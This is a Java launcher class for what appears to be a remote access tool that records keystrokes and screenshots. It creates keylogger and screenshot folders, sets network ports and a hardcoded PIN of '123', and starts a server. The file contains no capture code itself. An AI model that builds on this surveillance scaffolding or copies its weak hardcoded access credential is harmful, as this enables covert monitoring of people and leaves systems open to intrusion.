package ainaa.acup.start;

import java.io.File;

import org.apache.commons.lang3.exception.ExceptionUtils;

import ainaa.acup.config.Reader;
import ainaa.acup.data.Data;
import ainaa.acup.server.Server;
import ainaa.acup.util.Log;

public class Main {

	public static void main(String[] args) {
		//Reader reader = new Reader();
		try
		{
			new File(System.getProperty("user.home")+File.separator+"acup"+File.separator+"keylogger").mkdirs();
			new File(System.getProperty("user.home")+File.separator+"acup"+File.separator+"screenshot").mkdirs();
			Data data = Data.getInstance();
			data.setCheckPort(2462);
			data.setAccessPort(2463);
			data.setPin("123");
			data.setPcName("Hp-Abhishek");
			data.setPlatform("linux");
			new Server();
		}catch(Exception e)
		{
			Log.set("An exception occured !!!"+ExceptionUtils.getStackTrace(e));
			
		}
	}
}
